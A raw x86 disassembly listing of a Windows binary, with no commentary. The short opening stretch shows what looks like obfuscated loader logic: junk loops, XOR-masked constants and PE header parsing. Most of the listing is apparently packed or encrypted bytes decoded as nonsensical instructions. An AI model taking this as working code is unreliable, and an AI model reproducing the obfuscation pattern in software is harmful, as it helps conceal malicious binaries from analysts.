  4028aa:	push   DWORD PTR [ebp-0x24]
  4028ad:	push   0x43f7
  4028b2:	push   0x38dd
  4028b7:	push   DWORD PTR [ebp-0x10]
  4028ba:	push   0x3246
  4028bf:	push   0x510b
  4028c4:	push   0x8cd7
  4028c9:	push   DWORD PTR [ebp-0xc]
  4028cc:	push   0x63f7
  4028d1:	push   DWORD PTR [ebp-0x10]
  4028d4:	call   DWORD PTR ds:0x42e8bb
  4028da:	cmp    DWORD PTR ds:0x42d000,0x6
  4028e1:	jne    0x4028f4
  4028e7:	mov    ecx,DWORD PTR ds:0x42d000
  4028ed:	dec    ecx
  4028ee:	mov    DWORD PTR ds:0x42d000,ecx
  4028f4:	mov    ecx,DWORD PTR ds:0x42d000
  4028fa:	dec    ecx
  4028fb:	mov    DWORD PTR ds:0x42d000,ecx
  402901:	jmp    0x402880
  402906:	mov    ecx,0x751089b
  40290b:	xor    eax,ecx
  40290d:	cmp    eax,0xf89c85f0
  402912:	jne    0x402941
  402918:	mov    eax,DWORD PTR [ebp+0x8]
  40291b:	push   esi
  40291c:	mov    esi,DWORD PTR [ebp+0x8]
  40291f:	add    esi,DWORD PTR [eax+0x3c]
  402922:	mov    DWORD PTR [ebp+0x8],esi
  402925:	mov    eax,DWORD PTR [ebp-0x4]
  402928:	mov    esi,DWORD PTR [ebp+0x8]
  40292b:	xor    eax,ecx
  40292d:	add    eax,edx
  40292f:	cmp    DWORD PTR [esi+0x54],eax
  402932:	pop    esi
  402933:	je     0x402941
  402939:	mov    eax,DWORD PTR [ebp+0x8]
  40293c:	jmp    0x402948
  402941:	mov    eax,DWORD PTR [ebp-0x4]
  402944:	xor    eax,ecx
  402946:	add    eax,edx
  402948:	leave  
  402949:	ret    0x4
  40294c:	push   ebp
  40294d:	mov    ebp,esp
  40294f:	sub    esp,0x38
  402952:	xor    eax,eax
  402954:	xor    eax,DWORD PTR ds:0x42c00c
  40295a:	xor    DWORD PTR ds:0x42d010,eax
  402960:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  402967:	and    DWORD PTR ds:0x429020,0x0
  402971:	jmp    0x402981
  402976:	mov    eax,ds:0x429020
  40297b:	inc    eax
  40297c:	mov    ds:0x429020,eax
  402981:	cmp    DWORD PTR ds:0x429020,0x12
  402988:	jae    0x4029d7
  40298e:	cmp    DWORD PTR ds:0x429020,0x4
  402995:	jne    0x4029b5
  40299b:	push   0x3575
  4029a0:	push   0x2056
  4029a5:	push   0x7cad
  4029aa:	push   0x3741
  4029af:	call   DWORD PTR ds:0x42e8e7
  4029b5:	cmp    DWORD PTR ds:0x429020,0x3
  4029bc:	jne    0x4029d0
  4029c2:	xor    eax,eax
  4029c4:	add    eax,DWORD PTR ds:0x429020
  4029ca:	inc    eax
  4029cb:	mov    ds:0x429020,eax
  4029d0:	jmp    0x402976
  4029d5:	not    eax
  4029d7:	push   ebx
  4029d8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4029df:	mov    eax,DWORD PTR [ebp-0x4]
  4029e2:	add    DWORD PTR ds:0x42900c,0x42a018
  4029ec:	push   esi
  4029ed:	mov    esi,0x751089b
  4029f2:	xor    DWORD PTR ds:0x429018,0x429014
  4029fc:	xor    eax,esi
  4029fe:	sbb    DWORD PTR ds:0x42b000,0x77b
  402a08:	push   edi
  402a09:	mov    DWORD PTR ds:0x429018,0x1e
  402a13:	cmp    DWORD PTR ds:0x429018,0x0
  402a1a:	je     0x402a6e
  402a20:	cmp    DWORD PTR ds:0x429018,0xe
  402a27:	jne    0x402a42
  402a2d:	push   0x6dbc
  402a32:	push   0x42a004
  402a37:	push   0x657a
  402a3c:	call   DWORD PTR ds:0x42e8bf
  402a42:	cmp    DWORD PTR ds:0x429018,0xf
  402a49:	jne    0x402a5c
  402a4f:	mov    edi,DWORD PTR ds:0x429018
  402a55:	dec    edi
  402a56:	mov    DWORD PTR ds:0x429018,edi
  402a5c:	mov    edi,DWORD PTR ds:0x429018
  402a62:	dec    edi
  402a63:	mov    DWORD PTR ds:0x429018,edi
  402a69:	jmp    0x402a13
  402a6e:	mov    edi,0x3272e2
  402a73:	or     DWORD PTR ds:0x42a014,0x429014
  402a7d:	add    eax,edi
  402a7f:	adc    DWORD PTR ds:0x429008,0x42a018
  402a89:	mov    DWORD PTR [ebp-0x1c],eax
  402a8c:	movzx  eax,BYTE PTR ds:0x429010
  402a93:	xor    eax,DWORD PTR ds:0x42b00c
  402a99:	mov    ds:0x429010,eax
  402a9e:	mov    eax,DWORD PTR [ebp+0x14]
  402aa1:	test   eax,eax
  402aa3:	jmp    0x404df8
  402aa8:	retf   
  402aa9:	int    0x38
  402aab:	outs   dx,DWORD PTR ds:[esi]
  402aac:	cmp    cl,BYTE PTR [ebx-0x3abb3675]
  402ab2:	jae    0x402a43
  402ab4:	sbb    edx,edx
  402ab6:	inc    eax
  402ab7:	push   0x7c
  402ab9:	jl     0x402b37
  402abb:	jl     0x402af1
  402abd:	pop    edi
  402abe:	jl     0x402b3c
  402ac0:	adc    eax,0x1139172e
  402ac5:	and    eax,0x32652f13
  402aca:	popa   
  402acb:	pusha  
  402acc:	push   ecx
  402acd:	fs ins BYTE PTR es:[edi],dx
  402acf:	ins    BYTE PTR es:[edi],dx
  402ad0:	ins    DWORD PTR es:[edi],dx
  402ad1:	xor    al,0xc5
  402ad3:	fdivp  st(1),st
  402ad5:	push   0x42
  402ad7:	arpl   WORD PTR [ecx+0x53],di
  402ada:	stos   BYTE PTR es:[edi],al
  402adb:	jp     0x402b4a
  402add:	push   ecx
  402ade:	iret   
  402adf:	pop    ebp
  402ae0:	dec    esp
  402ae1:	cmp    cl,BYTE PTR [esi+0x577087fc]
  402ae7:	dec    ebp
  402ae8:	jg     0x402b21
  402aea:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402af0:	jmp    DWORD PTR cs:[eax-0x22]
  402af4:	cld    
  402af5:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402af9:	xor    ebp,ecx
  402afb:	mov    esp,0xd82b87ed
  402b00:	and    DWORD PTR [ecx],0xf
  402b03:	push   ecx
  402b04:	mov    ds:0x6df7c68c,eax
  402b09:	fld    QWORD PTR [esi]
  402b0b:	(bad)  
  402b0c:	or     ah,bh
  402b0e:	and    BYTE PTR [edx],dl
  402b10:	inc    edx
  402b11:	push   cs
  402b12:	and    BYTE PTR [ebx+0x62],ah
  402b15:	mov    cl,0xaf
  402b17:	sub    ebx,DWORD PTR [ecx+0x5]
  402b1a:	mov    al,ds:0x2341e1ff
  402b1f:	jbe    0x402b55
  402b21:	ret    0xf153
  402b24:	sbb    al,0xfc
  402b26:	jb     0x402ae1
  402b28:	jnp    0x402b07
  402b2a:	xchg   edx,eax
  402b2b:	pop    edi
  402b2c:	cmp    DWORD PTR [ecx+0x49841607],0xb
  402b33:	cwde   
  402b34:	ds je  0x402ac2
  402b37:	add    ebx,esp
  402b39:	sub    eax,0x4b368d54
  402b3e:	push   esi
  402b3f:	sti    
  402b40:	iret   
  402b41:	mov    WORD PTR [ecx],fs
  402b43:	or     edx,0x6982ceb7
  402b49:	out    0x45,al
  402b4b:	push   esp
  402b4c:	dec    esi
  402b4d:	push   cs
  402b4e:	cmp    BYTE PTR [ebx],cl
  402b50:	xor    BYTE PTR [ebx],bl
  402b52:	lods   eax,DWORD PTR ds:[esi]
  402b53:	inc    ebx
  402b54:	int3   
  402b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b56:	dec    edx
  402b57:	fiadd  DWORD PTR [esi]
  402b59:	push   eax
  402b5a:	std    
  402b5b:	push   esp
  402b5c:	push   eax
  402b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b5e:	icebp  
  402b5f:	bound  edi,QWORD PTR [edi+0x21d44f2]
  402b65:	clc    
  402b66:	add    BYTE PTR [ecx+ecx*4+0x27],dl
  402b6a:	cmp    dh,ah
  402b6c:	inc    eax
  402b6d:	fcmovne st,st(3)
  402b6f:	ucomiss xmm0,DWORD PTR [ecx]
  402b72:	js     0x402b2a
  402b74:	mov    dl,0x40
  402b76:	lahf   
  402b77:	fcom   DWORD PTR [esi-0x20219e05]
  402b7d:	repz cwde 
  402b7f:	and    ebp,DWORD PTR [eax-0x27]
  402b82:	fs aas 
  402b84:	cmp    eax,0xee603cbe
  402b89:	xlat   BYTE PTR ds:[ebx]
  402b8a:	xor    eax,0xd94f11a2
  402b8f:	sti    
  402b90:	mul    DWORD PTR [esi*4-0x2053c151]
  402b97:	and    esp,DWORD PTR [edx+ebx*4+0x3899d389]
  402b9e:	mov    DWORD PTR [eax-0x1],esp
  402ba1:	daa    
  402ba2:	sub    al,0x9f
  402ba4:	je     0x402c1c
  402ba6:	add    eax,0x65bd59c5
  402bab:	xlat   BYTE PTR ds:[ebx]
  402bac:	repnz and al,0xcd
  402baf:	sub    al,0xd7
  402bb1:	ror    ebx,0x37
  402bb4:	gs adc al,0xfe
  402bb7:	xchg   ecx,eax
  402bb8:	jns    0x402c1a
  402bba:	ins    DWORD PTR es:[edi],dx
  402bbb:	pushf  
  402bbc:	int    0x40
  402bbe:	popa   
  402bbf:	jmp    0x24b5:0x90556981
  402bc6:	dec    eax
  402bc7:	test   eax,0xb372d587
  402bcc:	push   es
  402bcd:	mov    ah,0x9a
  402bcf:	pop    ss
  402bd0:	fcomp  QWORD PTR [esi-0x10a34828]
  402bd6:	sbb    eax,0x107d33b0
  402bdb:	sub    al,BYTE PTR [ecx-0x17]
  402bde:	call   0xb00a:0x3bb88191
  402be5:	mov    al,ds:0xe7d50e2b
  402bea:	retf   
  402beb:	or     BYTE PTR [ebp+0x79e41f83],dh
  402bf1:	out    0xfc,eax
  402bf3:	xchg   ebp,eax
  402bf4:	aam    0x57
  402bf6:	js     0x402ba0
  402bf8:	hlt    
  402bf9:	xor    eax,0xd1a987a5
  402bfe:	lahf   
  402bff:	or     al,0x7c
  402c01:	test   DWORD PTR [edx+0x6a],0x4e8f80fd
  402c08:	add    DWORD PTR [ebp-0x6],esi
  402c0b:	or     BYTE PTR [ebx],0xbd
  402c0e:	cdq    
  402c0f:	dec    eax
  402c10:	mov    dh,0xcf
  402c12:	xchg   edi,eax
  402c13:	ret    0x8ae0
  402c16:	inc    ecx
  402c17:	add    DWORD PTR [ebp+0x5],edi
  402c1a:	xchg   ecx,eax
  402c1b:	xchg   edx,eax
  402c1c:	jb     0x402c54
  402c1e:	xchg   DWORD PTR [esi],ecx
  402c20:	cld    
  402c21:	fwait
  402c22:	push   0xc96c6ed1
  402c27:	pop    ds
  402c28:	retf   
  402c29:	xor    eax,0x671c4c05
  402c2e:	aam    0x9c
  402c30:	stos   DWORD PTR es:[edi],eax
  402c31:	pushf  
  402c32:	fnsave [esi]
  402c34:	dec    ebx
  402c35:	sbb    DWORD PTR [edi+0x29],ebx
  402c38:	cld    
  402c39:	imul   esi,DWORD PTR [eax-0x2c],0x1f
  402c3d:	mov    eax,0xb05d45cb
  402c42:	dec    ecx
  402c43:	add    esi,DWORD PTR [edi+ebx*4+0x38]
  402c47:	leave  
  402c48:	scas   eax,DWORD PTR es:[edi]
  402c49:	call   0x82e918a9
  402c4e:	push   ecx
  402c4f:	or     DWORD PTR [edx+0x47],ebx
  402c52:	pop    edi
  402c53:	cmp    al,0xfb
  402c55:	arpl   sp,di
  402c57:	xchg   ebx,eax
  402c58:	fucom  st(4)
  402c5a:	pushf  
  402c5b:	pusha  
  402c5c:	dec    edx
  402c5d:	cli    
  402c5e:	xchg   esp,eax
  402c5f:	xchg   ebx,eax
  402c60:	popf   
  402c61:	pushw  0xffc7
  402c64:	cs test al,0x71
  402c67:	xor    esi,DWORD PTR [eax-0x1d3a97a1]
  402c6d:	test   edi,esp
  402c6f:	loope  0x402cda
  402c71:	xchg   edx,eax
  402c72:	pop    ecx
  402c73:	mov    dh,0x2d
  402c75:	sub    eax,0x6b43a818
  402c7a:	add    bh,BYTE PTR [ebx+0x687b42f5]
  402c80:	jne    0x402c0d
  402c82:	jbe    0x402c9e
  402c84:	cmp    ch,ch
  402c86:	xor    ah,BYTE PTR [edx]
  402c88:	call   0xabb3:0xdb95d4d7
  402c8f:	add    eax,DWORD PTR [eax-0x382c57f1]
  402c95:	fs inc edi
  402c97:	xchg   BYTE PTR ds:0x96d690c6,ah
  402c9d:	popf   
  402c9e:	cmp    al,0x92
  402ca0:	sbb    DWORD PTR ds:0x63badfa,ecx
  402ca6:	jnp    0x402c92
  402ca8:	and    eax,ebp
  402caa:	cld    
  402cab:	mov    bh,0x5f
  402cad:	les    eax,FWORD PTR [esi]
  402caf:	xor    DWORD PTR [edx],esp
  402cb1:	pop    edi
  402cb2:	inc    dx
  402cb4:	cmp    BYTE PTR [edx+edx*2-0x78871501],bl
  402cbb:	js     0x402c7e
  402cbd:	sub    BYTE PTR [edi+0xd],al
  402cc0:	inc    eax
  402cc1:	in     eax,0x2a
  402cc3:	lods   eax,DWORD PTR ds:[esi]
  402cc4:	movzx  eax,WORD PTR [edx]
  402cc7:	int3   
  402cc8:	fst    DWORD PTR [esp+ebx*4-0x3dca87d8]
  402ccf:	aaa    
  402cd0:	(bad)  
  402cd1:	mov    ebp,0x92e7b1b
  402cd6:	sbb    DWORD PTR [eax-0x5e86d625],ecx
  402cdc:	pop    ecx
  402cdd:	xor    ah,bl
  402cdf:	call   esi
  402ce1:	sbb    ah,bh
  402ce3:	faddp  st(4),st
  402ce5:	push   eax
  402ce6:	xchg   ebx,eax
  402ce7:	data16 (bad) 
  402cea:	xor    esp,ecx
  402cec:	retf   0x60e7
  402cef:	popf   
  402cf0:	or     ebp,DWORD PTR [edi+0x7d]
  402cf3:	retf   0xec45
  402cf6:	mov    eax,ds:0x7c36f675
  402cfb:	dec    esp
  402cfc:	jmp    0xaac1:0xcf8193fd
  402d03:	loopne 0x402d5f
  402d05:	jge    0x402d41
  402d07:	mov    bh,BYTE PTR [eax]
  402d09:	xchg   ebp,eax
  402d0a:	pop    ecx
  402d0b:	xchg   ecx,eax
  402d0c:	inc    edi
  402d0d:	loop   0x402d28
  402d0f:	xor    cl,BYTE PTR [edi]
  402d11:	mov    fs,ebp
  402d13:	mov    al,ds:0xa284d692
  402d18:	inc    esp
  402d19:	in     eax,0x2
  402d1b:	mov    al,BYTE PTR ds:0xf4f4cee8
  402d21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d22:	jg     0x402cef
  402d24:	sub    eax,0x4bfcb74b
  402d29:	or     edx,DWORD PTR [esp+ebp*2+0x3cd7adf8]
  402d30:	sbb    DWORD PTR [edi+edi*1],edx
  402d33:	or     DWORD PTR [ebx-0x6a51eeb9],0x1a
  402d3a:	iret   
  402d3b:	jae    0x402d90
  402d3d:	xor    BYTE PTR [eax-0xc],dh
  402d40:	mov    eax,ds:0x5c7c7195
  402d45:	jno    0x402d22
  402d47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d48:	dec    ecx
  402d49:	push   ecx
  402d4a:	pop    eax
  402d4b:	out    0xdd,al
  402d4d:	mov    DWORD PTR [ecx],eax
  402d4f:	shr    edi,0xfe
  402d52:	les    esp,FWORD PTR [eax+0x4f]
  402d55:	retf   0xc415
  402d58:	paddd  mm2,QWORD PTR [ebp+esi*1-0x32e2e177]
  402d60:	xchg   DWORD PTR [ebx+0x4c6295c8],esi
  402d66:	xchg   esp,eax
  402d67:	mov    bl,cl
  402d69:	rep ins BYTE PTR es:[edi],dx
  402d6b:	fwait
  402d6c:	int3   
  402d6d:	mov    bl,0xc1
  402d6f:	int    0x56
  402d71:	retf   
  402d72:	lock shl BYTE PTR [ebx+0x785c29fa],0xc3
  402d7a:	cmp    eax,DWORD PTR [edx-0x56]
  402d7d:	jl     0x402d6d
  402d7f:	mov    esp,0xade97500
  402d84:	scas   al,BYTE PTR es:[edi]
  402d85:	(bad)
  402d89:	popf   
  402d8a:	shl    DWORD PTR [edx-0x5d],1
  402d8d:	clc    
  402d8e:	arpl   WORD PTR [eax-0xa147e4],bx
  402d94:	inc    edx
  402d95:	lds    ebx,FWORD PTR [ecx+edi*1+0x77968f47]
  402d9c:	nop
  402d9d:	mov    edi,0x2ec8e418
  402da2:	xchg   ecx,eax
  402da3:	clc    
  402da4:	or     bl,BYTE PTR [esi-0x66a72e23]
  402daa:	into   
  402dab:	cmp    BYTE PTR [eax+0x4a],0x7f
  402daf:	mov    gs,WORD PTR [edx-0x6]
  402db2:	mov    cl,0x6a
  402db4:	bnd je 0x402de1
  402db7:	scas   eax,DWORD PTR es:[edi]
  402db8:	imul   esp,ebx,0xffffffa1
  402dbb:	in     eax,0x57
  402dbd:	loope  0x402d7c
  402dbf:	in     eax,dx
  402dc0:	mov    DWORD PTR [edx+0x5d7d54df],ebx
  402dc6:	gs leave 
  402dc8:	int3   
  402dc9:	div    BYTE PTR [ebp+0x3736bc69]
  402dcf:	pop    eax
  402dd0:	inc    esi
  402dd1:	add    ah,dl
  402dd3:	aaa    
  402dd4:	ret    
  402dd5:	fwait
  402dd6:	jno    0x402e2a
  402dd8:	jo     0x402d9e
  402dda:	sbb    BYTE PTR [esi],ah
  402ddc:	push   ebp
  402ddd:	div    BYTE PTR [edx+0x40b309fa]
  402de3:	mov    ds:0x508543bc,eax
  402de8:	mov    cl,0xe1
  402dea:	mov    edi,0x4d8435a8
  402def:	jmp    0xae099c43
  402df4:	or     al,0x9d
  402df6:	stos   BYTE PTR es:[edi],al
  402df7:	push   0xffffffb6
  402df9:	ins    BYTE PTR es:[edi],dx
  402dfa:	push   ds
  402dfb:	cdq    
  402dfc:	retf   
  402dfd:	(bad)  
  402dfe:	xchg   esp,eax
  402dff:	int3   
  402e00:	sbb    DWORD PTR [esi],ebp
  402e02:	mov    bh,0x65
  402e04:	mov    ch,0xe8
  402e06:	inc    esp
  402e07:	loop   0x402e5f
  402e09:	pop    esi
  402e0a:	mov    ds:0xdf4af97f,al
  402e0f:	xor    BYTE PTR [esi-0x733c79fc],bh
  402e15:	push   edi
  402e16:	or     BYTE PTR [eax+esi*1+0x4a],ah
  402e1a:	xchg   ebp,eax
  402e1b:	jne    0x402de4
  402e1d:	sar    esp,1
  402e1f:	add    DWORD PTR [esi+0x2],edi
  402e22:	add    DWORD PTR [eax],ecx
  402e24:	pop    esi
  402e25:	or     eax,0x48e27b53
  402e2a:	test   BYTE PTR [ecx+0x2b1d4991],bh
  402e30:	fnstcw WORD PTR [edx+eax*1]
  402e33:	test   al,0xd4
  402e35:	xchg   ebp,eax
  402e36:	repnz (bad) 
  402e38:	je     0x402e2d
  402e3a:	mov    al,BYTE PTR [eax-0x69]
  402e3d:	dec    edx
  402e3e:	pop    ds
  402e3f:	ja     0x402ebb
  402e41:	xor    al,0x8e
  402e43:	pop    edi
  402e44:	dec    edx
  402e45:	mov    cs:0xd192387c,eax
  402e4b:	arpl   bx,si
  402e4d:	loope  0x402dff
  402e4f:	xor    DWORD PTR [eax+0x6cc758b4],0x3e3d1e9c
  402e59:	xchg   DWORD PTR [ebx-0x232ca32],esp
  402e5f:	out    0xe4,al
  402e61:	outs   dx,BYTE PTR ds:[esi]
  402e62:	mov    ch,0xf
  402e64:	push   ss
  402e65:	pop    ecx
  402e66:	stc    
  402e67:	xor    ecx,ebx
  402e69:	sbb    BYTE PTR [ecx-0x7e486e71],ch
  402e6f:	std    
  402e70:	jecxz  0x402e93
  402e72:	pop    ebp
  402e73:	jg     0x402e4d
  402e75:	jmp    0x13ac736
  402e7a:	sbb    BYTE PTR ds:0x4a8d0d79,dh
  402e80:	jle    0x402ec4
  402e82:	aam    0x62
  402e84:	mov    ecx,0xf2af4014
  402e89:	ja     0x402ebe
  402e8b:	xchg   ecx,eax
  402e8c:	int    0x5
  402e8e:	fwait
  402e8f:	mov    al,ds:0x37ee3f1
  402e94:	mov    bh,0x34
  402e96:	push   ebx
  402e97:	popf   
  402e98:	fcomp  st(5)
  402e9a:	jns    0x402e83
  402e9c:	stos   DWORD PTR es:[edi],eax
  402e9d:	imul   esi,DWORD PTR [ecx-0x7c6bcf20],0x3f
  402ea4:	mov    ch,BYTE PTR [ebx]
  402ea6:	loop   0x402ee8
  402ea8:	cld    
  402ea9:	pop    ss
  402eaa:	cdq    
  402eab:	lock inc edi
  402ead:	call   0x27bce4ae
  402eb2:	es inc edx
  402eb4:	das    
  402eb5:	sbb    ah,dh
  402eb7:	pop    ds
  402eb8:	jle    0x402ee9
  402eba:	iret   
  402ebb:	lds    esp,FWORD PTR [ebx+0x6]
  402ebe:	in     eax,dx
  402ebf:	adc    esp,DWORD PTR [esi-0xd96f3c1]
  402ec5:	sbb    eax,0x994e2ef5
  402eca:	push   0xfa25b41c
  402ecf:	add    edi,DWORD PTR [edx+0x1c7c711f]
  402ed5:	sub    bh,ch
  402ed7:	dec    esi
  402ed8:	les    esi,FWORD PTR [edi]
  402eda:	and    DWORD PTR [edi+0x286ad493],eax
  402ee0:	add    bh,BYTE PTR [edi-0x2f]
  402ee3:	sbb    ah,BYTE PTR ds:0xdf0d4dce
  402ee9:	xchg   edx,eax
  402eea:	xor    al,0xdc
  402eec:	adc    eax,0x507dbfac
  402ef1:	dec    esp
  402ef2:	add    eax,0x61a62773
  402ef7:	adc    dl,BYTE PTR [ebx-0x54]
  402efa:	mov    edi,0x69dd71b7
  402eff:	jne    0x402f13
  402f01:	ret    0x433e
  402f04:	call   0xda4c:0x7858ea7c
  402f0b:	cdq    
  402f0c:	call   0x31a7:0x1c742fc0
  402f13:	faddp  st(0),st
  402f15:	sub    cl,ah
  402f17:	inc    edx
  402f18:	btc    eax,esi
  402f1b:	jl     0x402ec4
  402f1d:	push   eax
  402f1e:	(bad)  
  402f1f:	mov    edi,edx
  402f21:	mov    al,0xe4
  402f23:	sub    ebx,DWORD PTR [esi+eax*2+0x7fa6f6d0]
  402f2a:	mov    ch,0xf4
  402f2c:	call   0x4fdd1206
  402f31:	xor    al,0x5c
  402f33:	inc    edx
  402f34:	aad    0x53
  402f36:	or     al,0x51
  402f38:	dec    esp
  402f39:	sub    edi,DWORD PTR [edx+0xb]
  402f3c:	xchg   edx,eax
  402f3d:	ins    DWORD PTR es:[edi],dx
  402f3e:	fcom   st(1)
  402f40:	(bad)  
  402f42:	mov    ebp,gs
  402f44:	(bad)  
  402f45:	jecxz  0x402f74
  402f47:	jg     0x402f96
  402f49:	jbe    0x402ee6
  402f4b:	ds sub eax,0xc888b93d
  402f51:	bound  edi,QWORD PTR [edx-0x66]
  402f54:	push   ss
  402f55:	lds    ebp,FWORD PTR [esp+eiz*8+0x2c]
  402f59:	fisttp DWORD PTR [ecx-0x58]
  402f5c:	pop    esi
  402f5d:	aam    0xea
  402f5f:	sbb    BYTE PTR [edx-0x80],bl
  402f62:	or     BYTE PTR [esi+eiz*1-0x2],0x5c
  402f67:	push   edx
  402f68:	xchg   BYTE PTR [edx-0x5438ac8d],dl
  402f6e:	fld    DWORD PTR [eax]
  402f70:	std    
  402f71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f72:	xor    al,0x5b
  402f74:	adc    DWORD PTR [ebp+0x24],0x18
  402f78:	out    dx,al
  402f79:	cli    
  402f7a:	rcl    al,0x30
  402f7d:	addr16 call 0xe973:0xd2557149
  402f85:	sub    BYTE PTR [ebx-0x12],dl
  402f88:	mov    ds:0xd55d66bb,eax
  402f8d:	mov    al,0x48
  402f8f:	xchg   DWORD PTR ss:[edx+0x46],ebp
  402f93:	out    dx,al
  402f94:	mov    ds:0xf497160d,al
  402f99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f9a:	mov    al,ds:0x97babbfc
  402f9f:	sbb    BYTE PTR [ecx],ah
  402fa1:	dec    ebp
  402fa2:	and    BYTE PTR [esi+0x63],bh
  402fa5:	mov    ah,0x7c
  402fa7:	mov    ah,0x23
  402fa9:	int    0x5b
  402fab:	cdq    
  402fac:	pop    es
  402fad:	mov    BYTE PTR [eax-0x71673416],ah
  402fb3:	mov    gs,WORD PTR [edi-0x1710b0ea]
  402fb9:	bound  eax,QWORD PTR [ecx-0x1b]
  402fbc:	fdiv   DWORD PTR [edx+edi*1-0x6df06027]
  402fc3:	(bad)  
  402fc4:	jl     0x402fcc
  402fc6:	adc    eax,0x95fa878e
  402fcb:	mov    bh,0xbf
  402fcd:	enter  0xe355,0xbe
  402fd1:	cli    
  402fd2:	and    DWORD PTR [ecx],esi
  402fd4:	sub    ecx,DWORD PTR [esi+0x8]
  402fd7:	mov    ch,0x94
  402fd9:	cmp    BYTE PTR [ebp+0x5801ea48],cl
  402fdf:	pop    ebp
  402fe0:	pop    edi
  402fe1:	rcl    BYTE PTR [esp+edi*2],cl
  402fe4:	sbb    DWORD PTR [ebp-0x4f243d5e],eax
  402fea:	frstor ds:[ebx]
  402fed:	pop    ecx
  402fee:	sub    dl,BYTE PTR [esi+0x184b4a29]
  402ff4:	add    bl,cl
  402ff6:	int    0x4b
  402ff8:	xor    al,0xc7
  402ffa:	push   esp
  402ffb:	fsubr  DWORD PTR [edx-0x2ee0613c]
  403001:	pop    es
  403002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403003:	fdivr  st(4),st
  403005:	xor    ebx,DWORD PTR [ecx]
  403007:	arpl   WORD PTR [edi+0x73],cx
  40300a:	mov    eax,0x428de03a
  40300f:	sbb    ah,cl
  403011:	jp     0x403037
  403013:	jns    0x402fbc
  403015:	pushf  
  403016:	mov    WORD PTR [ebp-0x6099bad6],gs
  40301c:	push   ecx
  40301d:	daa    
  40301e:	push   cs
  40301f:	dec    eax
  403020:	sbb    DWORD PTR [ecx+0xe],eax
  403023:	jae    0x40305a
  403025:	dec    edx
  403026:	adc    al,BYTE PTR [ecx-0x78]
  403029:	syscall 
  40302b:	push   edx
  40302c:	(bad)  
  40302d:	sub    al,0xa7
  40302f:	push   cs
  403030:	jmp    0x8b0e:0x728c51b8
  403037:	sbb    bh,cl
  403039:	sbb    ecx,DWORD PTR ds:0xf1e99fa2
  40303f:	(bad)  
  403041:	cld    
  403042:	shr    cl,0x9d
  403045:	out    dx,al
  403046:	popf   
  403047:	bnd ret 0xb56f
  40304b:	or     BYTE PTR [edx+0x1ee7edc8],bh
  403051:	pop    eax
  403052:	xchg   edi,eax
  403053:	icebp  
  403054:	dec    ecx
  403055:	lock std 
  403057:	jmp    0xa0b2312e
  40305c:	fadd   DWORD PTR [ebx+esi*4+0x45]
  403060:	and    BYTE PTR [ebx+0x2d],dl
  403063:	std    
  403064:	mov    edi,0x9600f3c5
  403069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40306a:	jae    0x40302e
  40306c:	or     al,0x72
  40306e:	scas   al,BYTE PTR es:[edi]
  40306f:	xor    al,0x19
  403071:	data16 repz fdivr QWORD PTR [ebx-0x18]
  403076:	inc    eax
  403077:	adc    al,0xc6
  403079:	pop    ecx
  40307a:	add    eax,0x5f8ab4a4
  40307f:	(bad)  
  403081:	call   0x8071:0x49458c0
  403088:	outs   dx,BYTE PTR ds:[esi]
  403089:	je     0x403097
  40308b:	jae    0x4030eb
  40308d:	dec    edi
  40308e:	fcomp  QWORD PTR [ebx+0x1803cf4c]
  403094:	(bad)  
  403095:	sbb    eax,0x888b5425
  40309a:	test   DWORD PTR gs:[ebx],edx
  40309d:	jnp    0x403103
  40309f:	(bad)  
  4030a0:	jns    0x40303d
  4030a2:	or     dh,BYTE PTR [esi]
  4030a4:	addr16 jmp 0x4030a1
  4030a7:	frstor [ebp+0x31]
  4030aa:	test   eax,0xade4e2f0
  4030af:	jp     0x403032
  4030b1:	xor    al,0x28
  4030b3:	fdivr  QWORD PTR [eax]
  4030b5:	nop
  4030b6:	jo     0x4030dd
  4030b8:	dec    ebp
  4030b9:	icebp  
  4030ba:	fist   DWORD PTR [ebp-0x365a7e08]
  4030c0:	imul   ebx,esi,0x74d75eec
  4030c6:	icebp  
  4030c7:	ret    0xbd25
  4030ca:	pop    esi
  4030cb:	in     al,dx
  4030cc:	cmp    al,0x99
  4030ce:	push   edx
  4030cf:	rcr    BYTE PTR [edi-0xcfefaf1],0xf2
  4030d6:	dec    edx
  4030d7:	adc    ah,al
  4030d9:	loopne 0x4030c7
  4030db:	add    BYTE PTR [ecx+0x3e39c677],0xb5
  4030e2:	push   ebp
  4030e3:	sub    bh,BYTE PTR [eax]
  4030e5:	or     BYTE PTR [eax+0x26],bh
  4030e8:	shl    BYTE PTR [edi+edi*2+0x4ab6aa59],cl
  4030ef:	dec    edx
  4030f0:	enter  0x66cc,0x86
  4030f4:	mov    edx,0x6206f875
  4030f9:	and    eax,0xf5a79e77
  4030fe:	pop    edi
  4030ff:	xchg   edx,eax
  403100:	or     DWORD PTR [ebp+ecx*2+0x59b78336],edx
  403107:	inc    edx
  403109:	aam    0x9c
  40310b:	mov    al,0xc2
  40310d:	mov    cl,0x1e
  40310f:	mov    edi,0xa2a9bcad
  403114:	ret    
  403115:	daa    
  403116:	inc    BYTE PTR [ecx+0x2f]
  403119:	aad    0x11
  40311b:	cwde   
  40311c:	jae    0x403137
  40311e:	fadd   DWORD PTR [edx+0x1d]
  403121:	call   0xeab1:0x55fe8a32
  403128:	fwait
  403129:	xchg   ebp,eax
  40312a:	inc    ecx
  40312b:	add    al,0x95
  40312d:	cmp    DWORD PTR [edi+0x2ed768ea],0x80f8c354
  403137:	enter  0xd707,0x8e
  40313b:	out    0xd5,al
  40313d:	fcom   st(7)
  40313f:	mov    edx,0xb65288d0
  403144:	les    ecx,FWORD PTR [edi]
  403146:	mov    ds:0xda41b2f2,eax
  40314b:	fistp  WORD PTR [edi+0x4668fffb]
  403151:	ds retf 
  403153:	jge    0x4031b2
  403155:	dec    ebx
  403156:	addr16 jae 0x4031b5
  403159:	lods   al,BYTE PTR ds:[esi]
